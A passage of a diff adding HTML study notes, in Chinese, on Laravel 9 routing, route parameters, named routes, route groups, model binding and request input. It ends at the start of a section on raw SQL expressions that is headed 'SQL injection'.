+<li>Tests 目录: tests 目录包含您的自动化测试。 开箱即用的示例 <a href="https://phpunit.de/">PHPUnit</a> 单元测试和功能测试。 每个测试类都应以单词“Test”作为后缀。 您可以使用 phpunit 或 php vendor/bin/phpunit 命令运行测试。 或者，如果您想要更详细和更漂亮的测试结果表示，您可以使用 php artisan test Artisan 命令运行测试。</li>
+
+<li>Vendor 目录: vendor 目录包含您的 <a href="https://getcomposer.org/">Composer</a> 依赖项。</li>
+</ul>
+
+<p>
+注意: 请确保， Web 服务器将所有请求定向到项目目录的 public/index.php 文件。 不应该将 index.php 文件移动到项目的根目录，因为从项目根目录提供应用程序会将许多敏感配置文件暴露到公网
+</p>
+</div>
+<div id="outline-container-h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8" class="outline-4">
+<h4 id="h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8"><a href="#h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8">入口</a></h4>
+<div class="outline-text-4" id="text-h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8">
+<p>
+Laravel 应用程序的所有请求的入口点都是 public/index.php 文件。所有请求都由你的 web 服务器（Apache/Nginx）配置定向到此文件。那个 index.php 文件不包含太多代码。相反，它是加载框架其余部分的起点。
+</p>
+
+<p>
+该 index.php 文件将加载 Composer 生成的自动加载器定义，然后从 bootstrap/app.php 中检索 Laravel应用程序的实例。 Laravel 本身采取的第一个操作是创建应用 / 服务容器 的实例。
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:b9df02e7-a36d-46f6-9df6-65de1cacb190" class="outline-3">
+<h3 id="h:b9df02e7-a36d-46f6-9df6-65de1cacb190"><a href="#h:b9df02e7-a36d-46f6-9df6-65de1cacb190">基本路由</a></h3>
+<div class="outline-text-3" id="text-h:b9df02e7-a36d-46f6-9df6-65de1cacb190">
+<p>
+最基本的Laravel路由接受一个 URI 和一个闭包，提供了一个简单优雅的方法来定义路由和行为，而不需要复杂的路由配置文件:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">use Illuminate\Support\Facades\Route;
+
+Route::get('/greeting', function () {
+  return 'Hello World';
+});
+</pre>
+</div>
+</div>
+<div id="outline-container-h:c0cb8938-e8aa-478f-b910-4be3d57ba879" class="outline-4">
+<h4 id="h:c0cb8938-e8aa-478f-b910-4be3d57ba879"><a href="#h:c0cb8938-e8aa-478f-b910-4be3d57ba879">默认路由文件</a></h4>
+<div class="outline-text-4" id="text-h:c0cb8938-e8aa-478f-b910-4be3d57ba879">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#the-default-route-files">https://laravel.p2hp.com/cndocs/9.x/routing#the-default-route-files</a>
+</p>
+
+<p>
+所有Laravel路由都定义在你的路由文件中，它位于 routes 目录。这些文件会被你的应用程序中的 <code>App\Providers\RouteServiceProvider</code> 自动加载。 routes/web.php 文件用于定义 web 界面的路由。这些路由被分配给 web 中间件组, 它提供了 SESSION 状态和 CSRF 保护等功能。定义在 routes/api.php 中的路由都是无状态的，并且被分配了 api 中间件组。
+</p>
+
+<p>
+对于大多数应用程序，都是以在 routes/web.php 文件定义路由开始的。可以通过在浏览器中输入定义的路由URL 来访问 routes/web.php 中定义的路由。例如，你可以在浏览器中输入 <a href="http://example.com/user">http://example.com/user</a> 来访问以下路由：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">use App\Http\Controllers\UserController;
+
+Route::get('/user', [UserController::class, 'index']);
+</pre>
+</div>
+
+<p>
+定义在 routes/api.php 文件中的路由是被 RouteServiceProvider 嵌套在一个路由组内。 在这个路由组内,将自动应用 /api URI 前缀，所以你无需手动将其应用于文件中的每个路由。你可以通过修改RouteServiceProvider 类来修改前缀和其他路由组选项。
+</p>
+</div>
+</div>
+<div id="outline-container-h:f94ec2c9-52a4-482d-9df5-4bf377b764f7" class="outline-4">
+<h4 id="h:f94ec2c9-52a4-482d-9df5-4bf377b764f7"><a href="#h:f94ec2c9-52a4-482d-9df5-4bf377b764f7">可用的路由方法</a></h4>
+<div class="outline-text-4" id="text-h:f94ec2c9-52a4-482d-9df5-4bf377b764f7">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#available-router-methods">https://laravel.p2hp.com/cndocs/9.x/routing#available-router-methods</a>
+</p>
+
+<p>
+路由器允许你注册能响应任何 HTTP 请求的路由：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::get($uri, $callback);
+Route::post($uri, $callback);
+Route::put($uri, $callback);
+Route::patch($uri, $callback);
+Route::delete($uri, $callback);
+Route::options($uri, $callback);
+</pre>
+</div>
+
+<p>
+有的时候你可能需要注册一个可响应多个 HTTP 请求的路由，这时你可以使用 match 方法，也可以使用 any 方法注册一个实现响应所有 HTTP 请求的路由：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::match(['get', 'post'], '/', function () {
+//
+});
+
+Route::any('/', function () {
+//
+});
+</pre>
+</div>
+
+<p>
+技巧：当定义多个相同路由时，使用 get ， post ， put ， patch ， delete ， 和 options 方法的路由应该在使用 any ， match ， 和 redirect 方法的路由之定义，这样可以确保请求与正确的路由匹配。
+</p>
+</div>
+</div>
+<div id="outline-container-h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180" class="outline-4">
+<h4 id="h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180"><a href="#h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180">依赖注入</a></h4>
+<div class="outline-text-4" id="text-h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#dependency-injection">https://laravel.p2hp.com/cndocs/9.x/routing#dependency-injection</a>
+</p>
+
+<p>
+你可以在路由的回调方法中，以形参的方式声明路由所需要的任何依赖项。这些依赖会被 Laravel 的 容器 自动解析并注入。 例如, 你可以在闭包中声明 Illuminate\Http\Request 类，让当前的 HTTP 请求自动注入依赖到您的路由回调中：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">use Illuminate\Http\Request;
+
+Route::get('/users', function (Request $request) {
+// ...
+});
+</pre>
+</div>
+
+
+<p>
+function (Request $request)  将request自动注入到Request类中
+</p>
+</div>
+</div>
+<div id="outline-container-h:83c07513-01a8-4fe3-adc6-1a86f29128d1" class="outline-4">
+<h4 id="h:83c07513-01a8-4fe3-adc6-1a86f29128d1"><a href="#h:83c07513-01a8-4fe3-adc6-1a86f29128d1">CSRF 保护</a></h4>
+<div class="outline-text-4" id="text-h:83c07513-01a8-4fe3-adc6-1a86f29128d1">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#csrf-protection">https://laravel.p2hp.com/cndocs/9.x/routing#csrf-protection</a>
+</p>
+
+<p>
+请记住，指向 POST 、 PUT 、 PATCH 、 或 DELETE 路由的任何 HTML 表单都应该包含一个 CSRF 令牌字段，否则，这个请求将会被拒绝。可以在 CSRF 文档 中阅读有关 CSRF 更多的信息:
+</p>
+
+<p>
+在前后端不分离时使用
+</p>
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span class="org-function-name">form</span> <span class="org-variable-name">method</span>=<span class="org-string">"POST"</span> <span class="org-variable-name">action</span>=<span class="org-string">"/profile"</span>&gt;
+  @csrf
+   ...
+&lt;/<span class="org-function-name">form</span>&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:ce8dc675-ad7d-4382-9d87-0baabb460806" class="outline-4">
+<h4 id="h:ce8dc675-ad7d-4382-9d87-0baabb460806"><a href="#h:ce8dc675-ad7d-4382-9d87-0baabb460806">重定向路由</a></h4>
+<div class="outline-text-4" id="text-h:ce8dc675-ad7d-4382-9d87-0baabb460806">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#redirect-routes">https://laravel.p2hp.com/cndocs/9.x/routing#redirect-routes</a>
+</p>
+
+<p>
+如果要定义重定向到另一个 URI 的路由，可以使用 Route::redirect 方法。这个方法可以快速的实现重定向，而不再需要去定义完整的路由或者控制器:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::redirect('/here', '/there');
+</pre>
+</div>
+
+<p>
+默认情况下， Route::redirect 返回 302 状态码。你可以使用可选的第三个参数来定制状态码:
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::redirect('/here', '/there', 301);
+</pre>
+</div>
+
+<p>
+或者，你可以使用 Route::permanentRedirect 方法返回 301 状态码:
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::permanentRedirect('/here', '/there');
+</pre>
+</div>
+
+<p>
+注意：在重定向路由中使用路由参数时，以下参数由 Laravel 保留，不能使用： destination 和 status
+</p>
+</div>
+</div>
+<div id="outline-container-h:f73bb9b6-9d51-4c6c-b766-c1842da26de0" class="outline-4">
+<h4 id="h:f73bb9b6-9d51-4c6c-b766-c1842da26de0"><a href="#h:f73bb9b6-9d51-4c6c-b766-c1842da26de0">视图路由</a></h4>
+<div class="outline-text-4" id="text-h:f73bb9b6-9d51-4c6c-b766-c1842da26de0">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#view-routes">https://laravel.p2hp.com/cndocs/9.x/routing#view-routes</a>
+</p>
+
+<p>
+如果你的路由只需要返回一个 视图，可以使用 Route::view 方法。它和 redirect 一样方便，不需要定义完整的路由或控制器。 view 方法有三个参数，其中前两个是必填参数，分别是 URI 和视图名称。第三个参数选填，可以传入一个数组，数组中的数据会被传递给视图:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::view('/welcome', 'welcome');
+
+Route::view('/welcome', 'welcome', ['name' =&gt; 'Taylor']);
+</pre>
+</div>
+
+<p>
+注意：当在图路由使用路线参数，下面的参数是由 Laravel 保留，不能使用： view ， data ， status ， 和 headers
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:f6e2e169-833f-49b8-a4a9-de3d189b96a3" class="outline-3">
+<h3 id="h:f6e2e169-833f-49b8-a4a9-de3d189b96a3"><a href="#h:f6e2e169-833f-49b8-a4a9-de3d189b96a3">路由参数</a></h3>
+<div class="outline-text-3" id="text-h:f6e2e169-833f-49b8-a4a9-de3d189b96a3">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-parameters">https://laravel.p2hp.com/cndocs/9.x/routing#route-parameters</a>
+</p>
+</div>
+<div id="outline-container-h:045cfae3-b935-43b6-8e06-1bdcfdc0a591" class="outline-4">
+<h4 id="h:045cfae3-b935-43b6-8e06-1bdcfdc0a591"><a href="#h:045cfae3-b935-43b6-8e06-1bdcfdc0a591">必填参数</a></h4>
+<div class="outline-text-4" id="text-h:045cfae3-b935-43b6-8e06-1bdcfdc0a591">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#required-parameters">https://laravel.p2hp.com/cndocs/9.x/routing#required-parameters</a>
+</p>
+
+<p>
+有时您将需要捕获路由内的 URI 段。例如，您可能需要从 URL 中捕获用户的 ID。您可以通过定义路由参数来做到这一点：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/user/{id}', function ($id) {
+return 'User '.$id;
+});
+</pre>
+</div>
+
+<p>
+也可以根据您的需要在路由中定义多个参数：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/posts/{post}/comments/{comment}', function ($postId, $commentId) {
+//
+});
+</pre>
+</div>
+
+<p>
+路由的参数通常都会被放在 {} ，并且参数名只能为字母。 下划线 ( _ ) 也可以用于路由参数名中。路由参数会按路由定义的顺序依次注入到路由回调或者控制器中 - ，而不受回调或者控制器的参数名称的影响。
+</p>
+
+<p>
+安全分享：
+</p>
+<ul class="org-ul">
+<li>识别参数位置
+<ul class="org-ul">
+<li>可通过日志做相似度匹配，来判断接口中哪些是参数</li>
+</ul></li>
+<li>开发适配路由参数的扫描器</li>
+</ul>
+</div>
+<div id="outline-container-h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb" class="outline-5">
+<h5 id="h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb"><a href="#h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb">参数和依赖注入</a></h5>
+<div class="outline-text-5" id="text-h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#parameters-and-dependency-injection">https://laravel.p2hp.com/cndocs/9.x/routing#parameters-and-dependency-injection</a>
+</p>
+
+<p>
+如果您的路由具有依赖关系，而您希望 Laravel 服务容器自动注入到路由的回调中，则应在依赖关系之后列出路由参数：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">use Illuminate\Http\Request;
+
+Route::get('/user/{id}', function (Request $request, $id) {
+return 'User '.$id;
+});
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:48b1497a-5027-406c-aae6-aacd08820e12" class="outline-4">
+<h4 id="h:48b1497a-5027-406c-aae6-aacd08820e12"><a href="#h:48b1497a-5027-406c-aae6-aacd08820e12">可选参数</a></h4>
+<div class="outline-text-4" id="text-h:48b1497a-5027-406c-aae6-aacd08820e12">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#parameters-optional-parameters">https://laravel.p2hp.com/cndocs/9.x/routing#parameters-optional-parameters</a>
+</p>
+
+<p>
+有时，你可能需要指定一个路由参数，但你希望这个参数是可选的。你可以在参数后面加上 ? 标记来实现，但前提是要确保路由的相应变量有默认值：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/user/{name?}', function ($name = null) {
+  return $name;
+});
+
+Route::get('/user/{name?}', function ($name = 'John') {
+  return $name;
+});
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:a70c96fc-314f-421d-9bea-bbc47e66a8a9" class="outline-4">
+<h4 id="h:a70c96fc-314f-421d-9bea-bbc47e66a8a9"><a href="#h:a70c96fc-314f-421d-9bea-bbc47e66a8a9">正则表达式约束</a></h4>
+<div class="outline-text-4" id="text-h:a70c96fc-314f-421d-9bea-bbc47e66a8a9">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#parameters-regular-expression-constraints">https://laravel.p2hp.com/cndocs/9.x/routing#parameters-regular-expression-constraints</a>
+</p>
+
+<p>
+您可以使用路由实例上的 where 方法来限制路由参数的格式。 where 方法接受参数的名称和定义如何约束参数的正则表达式：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/user/{name}', function ($name) {
+//
+})-&gt;where('name', '[A-Za-z]+');
+
+Route::get('/user/{id}', function ($id) {
+//
+})-&gt;where('id', '[0-9]+');
+
+Route::get('/user/{id}/{name}', function ($id, $name) {
+//
+})-&gt;where(['id' =&gt; '[0-9]+', 'name' =&gt; '[a-z]+']);
+</pre>
+</div>
+
+<p>
+为方便起见，一些常用的正则表达式模式具有帮助方法，可让您快速将模式约束添加到路由：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/user/{id}/{name}', function ($id, $name) {
+//
+})-&gt;whereNumber('id')-&gt;whereAlpha('name');
+
+Route::get('/user/{name}', function ($name) {
+//
+})-&gt;whereAlphaNumeric('name');
+
+Route::get('/user/{id}', function ($id) {
+//
+})-&gt;whereUuid('id');
+</pre>
+</div>
+
+<p>
+如果传入的请求与路由模式约束不匹配，将返回 404 HTTP 响应。
+</p>
+</div>
+<div id="outline-container-h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9" class="outline-5">
+<h5 id="h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9"><a href="#h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9">全局约束</a></h5>
+<div class="outline-text-5" id="text-h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#parameters-global-constraints">https://laravel.p2hp.com/cndocs/9.x/routing#parameters-global-constraints</a>
+</p>
+
+<p>
+如果您希望路由参数始终受给定正则表达式的约束，您可以使用 pattern 方法。 您应该在App\Providers\RouteServiceProvider 类的 boot 方法中定义这些模式：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">/**
+* 定义路由模型绑定、模式过滤器等。
+*
+* @return void
+*/
+public function boot()
+{
+Route::pattern('id', '[0-9]+');
+}
+</pre>
+</div>
+
+<p>
+一旦定义了模式，它就会自动应用到使用该参数名称的所有路由：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/user/{id}', function ($id) {
+  // 仅当{id}是数字时执行。。。
+});
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:db1d62da-059e-4c15-86f2-c43582ad87c7" class="outline-3">
+<h3 id="h:db1d62da-059e-4c15-86f2-c43582ad87c7"><a href="#h:db1d62da-059e-4c15-86f2-c43582ad87c7">命名路由</a></h3>
+<div class="outline-text-3" id="text-h:db1d62da-059e-4c15-86f2-c43582ad87c7">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#named-routes">https://laravel.p2hp.com/cndocs/9.x/routing#named-routes</a>
+</p>
+
+<p>
+命名路由允许为特定路由方便地生成URL或重定向。通过将 name 方法链接到路由定义上，可以指定路由的名称：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/user/profile', function () {
+//
+})-&gt;name('profile');
+</pre>
+</div>
+
+<p>
+您还可以为控制器操作指定路由名称：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::get(
+'/user/profile',
+ [UserProfileController::class, 'show'] )-&gt;name('profile');
+</pre>
+</div>
+
+<p>
+注意：路由名称应始终是唯一的。
+</p>
+</div>
+<div id="outline-container-h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1" class="outline-4">
+<h4 id="h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1"><a href="#h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1">生成命名路由的 URL</a></h4>
+<div class="outline-text-4" id="text-h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#generating-urls-to-named-routes">https://laravel.p2hp.com/cndocs/9.x/routing#generating-urls-to-named-routes</a>
+</p>
+
+<p>
+一旦你为给定的路由分配了一个名字，你可以在通过 Laravel 的 route 和 redirect 辅助函数生成 URL 或重定向时使用该路由的名称：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">// 正在生成 URL...
+$url = route('profile');
+
+// 正在生成重定向...
+return redirect()-&gt;route('profile');
+</pre>
+</div>
+
+<p>
+如果命名路由定义了参数，您可以将参数作为第二个参数传递给 route 函数。 给定的参数将自动插入到生成的URL 的正确位置：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/user/{id}/profile', function ($id) {
+//
+})-&gt;name('profile');
+$url = route('profile', ['id' =&gt; 1]);
+</pre>
+</div>
+
+<p>
+如果您在数组中传递其他参数，这些键/值对将自动添加到生成的 URL 的查询字符串中：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Route::get('/user/{id}/profile', function ($id) {
+//
+})-&gt;name('profile');
+
+$url = route('profile', ['id' =&gt; 1, 'photos' =&gt; 'yes']);
+
+// /user/1/profile?photos=yes
+</pre>
+</div>
+
+<p>
+技巧：有时，您可能希望为 URL 参数指定请求范围的默认值，例如当前语言环境。 为此，您可以使用<a href="https://laravel.p2hp.com/cndocs/9.x/urls#default-values">URL::defaults</a> 方法。
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:04a3d8dd-61fe-4c08-a58d-b33e3584242d" class="outline-3">
+<h3 id="h:04a3d8dd-61fe-4c08-a58d-b33e3584242d"><a href="#h:04a3d8dd-61fe-4c08-a58d-b33e3584242d">路由组</a></h3>
+<div class="outline-text-3" id="text-h:04a3d8dd-61fe-4c08-a58d-b33e3584242d">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-groups">https://laravel.p2hp.com/cndocs/9.x/routing#route-groups</a>
+</p>
+
+<p>
+路由组允许您共享路由属性，例如中间件，而无需在每个单独的路由上定义这些属性。
+</p>
+
+<p>
+嵌套组尝试智能地将属性与其父组“合并”。 中间件和 where 条件合并，同时附加名称和前缀。 URI 前缀中的命名空间分隔符和斜杠会在适当的地方自动添加。
+</p>
+</div>
+<div id="outline-container-h:8a37bc32-1404-4187-a1cc-55c3d29fce1a" class="outline-4">
+<h4 id="h:8a37bc32-1404-4187-a1cc-55c3d29fce1a"><a href="#h:8a37bc32-1404-4187-a1cc-55c3d29fce1a">路由中间件</a></h4>
+<div class="outline-text-4" id="text-h:8a37bc32-1404-4187-a1cc-55c3d29fce1a">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-group-middleware">https://laravel.p2hp.com/cndocs/9.x/routing#route-group-middleware</a>
+</p>
+
+<p>
+要将 <a href="https://laravel.p2hp.com/cndocs/9.x/middleware">middleware</a> 分配给组内的所有路由，您可以在定义组之前使用 middleware 方法。 中间件按照它们在数组中列出的顺序执行：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::middleware(['first', 'second'])-&gt;group(function () {
+    Route::get('/', function () {
+    // 使用第一个和第二个中间件...
+     });
+    Route::get('/user/profile', function () {
+    // 使用第一个和第二个中间件...
+     });
+});
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:17ba9adc-fc2b-4c85-9a19-889494070a33" class="outline-4">
+<h4 id="h:17ba9adc-fc2b-4c85-9a19-889494070a33"><a href="#h:17ba9adc-fc2b-4c85-9a19-889494070a33">控制器</a></h4>
+<div class="outline-text-4" id="text-h:17ba9adc-fc2b-4c85-9a19-889494070a33">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-group-controllers">https://laravel.p2hp.com/cndocs/9.x/routing#route-group-controllers</a>
+</p>
+
+<p>
+如果一组路由都使用相同的 <a href="https://laravel.p2hp.com/cndocs/9.x/controllers">控制器</a>，您可以使用 controller 方法为组内的所有路由定义公共控制器。 然后，在定义路由时，您只需要提供它们调用的控制器方法：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">use App\Http\Controllers\OrderController;
+
+Route::controller(OrderController::class)-&gt;group(function () {
+  Route::get('/orders/{id}', 'show');
+  Route::post('/orders', 'store');
+});
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653" class="outline-4">
+<h4 id="h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653"><a href="#h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653">子域路由</a></h4>
+<div class="outline-text-4" id="text-h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-group-subdomain-routing">https://laravel.p2hp.com/cndocs/9.x/routing#route-group-subdomain-routing</a>
+</p>
+
+<p>
+路由组也可以用来处理子域路由。子域可以像路由 uri 一样被分配路由参数，允许您捕获子域的一部分以便在路由或控制器中使用。 子域可以在定义组之前调用 domain 方法来指定:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::domain('{account}.example.com')-&gt;group(function () {
+    Route::get('user/{id}', function ($account, $id) {
+      //
+    });
+});
+</pre>
+</div>
+
+<p>
+注意：为了确保子域路由是可以访问的，你应该在注册根域路由之前注册子域路由。这将防止根域路由覆盖具有相同 URI 路径的子域路由。
+</p>
+</div>
+</div>
+<div id="outline-container-h:0dfb326a-42f7-4392-91b8-62965608efb0" class="outline-4">
+<h4 id="h:0dfb326a-42f7-4392-91b8-62965608efb0"><a href="#h:0dfb326a-42f7-4392-91b8-62965608efb0">路由前缀</a></h4>
+<div class="outline-text-4" id="text-h:0dfb326a-42f7-4392-91b8-62965608efb0">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#route-group-prefixes">https://laravel.p2hp.com/cndocs/9.x/routing#route-group-prefixes</a>
+</p>
+
+<p>
+prefix 方法可以用给定的 URI 为组中的每个路由做前缀。例如，你可能想要在组内的所有路由 uri 前面加上admin 前缀:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Route::prefix('admin')-&gt;group(function () {
+  Route::get('/users', function () {
+  // Matches The "/admin/users" URL
+   });
+});
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac" class="outline-4">
+<h4 id="h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac"><a href="#h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac">隐式绑定</a></h4>
+<div class="outline-text-4" id="text-h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac">
+<p>
+<a href="https://laravel.p2hp.com/cndocs/9.x/routing#implicit-binding">https://laravel.p2hp.com/cndocs/9.x/routing#implicit-binding</a>
+</p>
+
+<p>
+Laravel 自动解析定义在路由或控制器操作中的 Eloquent 模型，其类型提示的变量名称与路由段名称匹配。 例如：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">use App\Models\User;
+
+Route::get('/users/{user}', function (User $user) {
+return $user-&gt;email;
+});
+</pre>
+</div>
+
+<p>
+由于 $user 变量被类型提示为 App\Models\User Eloquent 模型，并且变量名称与 {user} URI 段匹配，Laravel 将自动注入 ID 匹配相应的模型实例 来自请求 URI 的值。 如果在数据库中没有找到匹配的模型实例，将自动生成 404 HTTP 响应。
+</p>
+
+<p>
+当然，使用控制器方法时也可以使用隐式绑定。 同样，请注意 {user} URI 段与控制器中的 $user 变量匹配，该变量包含 App\Models\User 类型提示：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">use App\Http\Controllers\UserController;
+use App\Models\User;
+
+// Route definition...
+Route::get('/users/{user}', [UserController::class, 'show']);
+
+// Controller method definition...
+public function show(User $user) {
+  return view('user.profile', ['user' =&gt; $user]);
+}
+</pre>
+</div>
+
+<p>
+定义一个包含 {user} 参数的路由：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">use App\Models\User;
+
+Route::get('/users/{user}', function (User $user) {
+//
+});
+</pre>
+</div>
+
+<p>
+由于我们已将所有 {user} 参数绑定到 App\Models\User 模型，该类的一个实例将被注入到路由中。 因此，例如，对 users/1 的请求将从 ID 为 1 的数据库中注入 User 实例。
+</p>
+
+<p>
+如果在数据库中没有找到匹配的模型实例，则会自动生成 404 HTTP 响应。
+</p>
+</div>
+</div>
+<div id="outline-container-h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd" class="outline-4">
+<h4 id="h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd"><a href="#h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd">获取参数</a></h4>
+<div class="outline-text-4" id="text-h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd">
+<p>
+laravel 通过Illuminate\Http\Request类来处理用户的请求
+</p>
+
+<p>
+传入的请求实例将由 Laravel <a href="https://laravel.p2hp.com/cndocs/9.x/container">服务容器</a> 自动注入
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+namespace App\Http\Controllers;
+use Illuminate\Http\Request;
+class UserController extends Controller
+{
+   /**
+   * 存储一个新用户. *
+   * @param \Illuminate\Http\Request $request
+   * @return \Illuminate\Http\Response
+   */
+   public function store(Request $request)
+   {
+       $name = $request-&gt;input('name');
+       //
+   }
+}
+</pre>
+</div>
+
+<p>
+你可以使用 header 方法从 Illuminate\Http\Request 实例中检索一个请求头。如果请求中不存在该头，将返回 null 。然而， header 方法接受一个可选的第二个参数，如果请求中不存在该头，将返回该参数：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">$<span class="org-variable-name">value</span> = $<span class="org-variable-name">request</span>-&gt;header(<span class="org-string">'X-Header-Name'</span>);
+
+$<span class="org-variable-name">value</span> = $<span class="org-variable-name">request</span>-&gt;header(<span class="org-string">'X-Header-Name'</span>, <span class="org-string">'default'</span>);
+</pre>
+</div>
+
+<p>
+使用一些简单的方法，可以从 Illuminate\Http\Request 实例获取所有的用户输入数据，而不用在意用户使用的是哪种 HTTP 动词。不管是什么 HTTP 动词， input 方法都可以用来获取用户的输入数据：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">$<span class="org-variable-name">name</span> = $<span class="org-variable-name">request</span>-&gt;input(<span class="org-string">'name'</span>);
+</pre>
+</div>
+
+<p>
+可以将默认值作为第二个参数传递给 input 方法。 如果请求中不存在第一个参数指定的字段的输入值，则将返回此值：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">$<span class="org-variable-name">name</span> = $<span class="org-variable-name">request</span>-&gt;input(<span class="org-string">'name'</span>, <span class="org-string">'Sally'</span>);
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:bf55aef1-87cf-4fda-a186-3e0c0b503434" class="outline-4">
+<h4 id="h:bf55aef1-87cf-4fda-a186-3e0c0b503434"><a href="#h:bf55aef1-87cf-4fda-a186-3e0c0b503434">sql注入</a></h4>
+<div class="outline-text-4" id="text-h:bf55aef1-87cf-4fda-a186-3e0c0b503434">
+<p>
+原生表达式
+</p>
+
+<p>
+要创建原始字符串表达式，可以使用 DB facade提供的 raw 方法：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">$<span class="org-variable-name">users</span> = DB::table(<span class="org-string">'users'</span>)
+    -&gt;select(DB::raw(<span class="org-string">'count(*) as user_count, status'</span>))
+    -&gt;where(<span class="org-string">'status'</span>, <span class="org-string">'&lt;&gt;'</span>, 1)
+    -&gt;groupBy(<span class="org-string">'status'</span>)
+    -&gt;get();
+</pre>
+</div>
+
+<p>
+selectRaw 方法可以代替 addSelect(DB::raw(&#x2026;)) 。该方法的第二个参数是可选项，值是一个绑定参数的数组：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">$<span class="org-variable-name">orders</span> = DB::table(<span class="org-string">'orders'</span>)
